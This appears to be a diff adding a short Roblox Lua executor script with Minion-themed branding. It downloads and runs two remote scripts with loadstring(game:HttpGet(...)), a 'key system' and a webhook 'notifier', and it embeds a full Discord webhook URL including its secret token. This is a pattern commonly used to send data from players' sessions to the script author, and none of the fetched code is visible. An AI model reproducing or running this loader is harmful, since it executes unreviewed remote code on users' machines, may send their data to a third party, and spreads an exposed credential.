@@ -1,0 +1,18 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MinionRoblox/KeySystem-AFK-For-UGC/main/Keygame.lua"))()
+
+
+getgenv().Title = "Information"
+getgenv().ThumbnailUrl = "https://static1.colliderimages.com/wordpress/wp-content/uploads/2023/04/minions.jpg?q=50&fit=contain&w=1140&h=&dpr=1.5"
+getgenv().Color = 0x000000 -- Black
+
+getgenv().FieldTitle = "Minion"
+getgenv().FieldText = "Banana"
+
+getgenv().FooterText = "Scripts from Minion"
+getgenv().FooterUrl = "https://static.vecteezy.com/system/resources/previews/014/990/430/non_2x/schocking-minions-the-illustration-vector.jpg"
+
+getgenv().Webhook = "https://discord.com/api/webhooks/1230586706579951647/96MRIMTWoU-V4pJu6KtCzf3gezgkgnZ6OqIogPLYxh-fkZTAEQdiheh_9TQV4zMCF9UI"
+
+coroutine.wrap(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAScripts/Webhook/main/Notifer.lua"))()
+end)()
+
